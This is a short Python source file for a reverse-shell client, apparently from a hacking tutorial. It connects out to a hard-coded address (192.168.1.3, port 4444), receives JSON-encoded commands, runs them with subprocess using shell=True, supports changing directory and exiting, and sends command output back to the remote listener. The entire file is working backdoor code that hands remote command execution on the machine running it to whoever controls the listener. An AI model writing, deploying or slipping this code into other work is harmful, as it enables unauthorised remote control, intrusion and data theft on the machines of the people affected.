import socket
import subprocess
import json
import os


class Client:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # here socket.AF_INET is your ipv4 and
        # socket.SOCK_STREAM is your tcp/ip
        self.connection.connect((ip, port))  # connection back to server

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)  # returning system command output

    def send_data(self, command):
        json_data = json.dumps(command)  # dump data into json object
        self.connection.send(json_data.encode())  # sending json object back to server

    def receive_data(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)  # receiving json object from server
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing Working Directory to " + path

    def run(self):
        while True:
            command = self.receive_data()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_directory(command[1])
            else:
                command_result = self.execute_system_command(command).decode()
            self.send_data(command_result)


client = Client("192.168.1.3", 4444)
client.run()
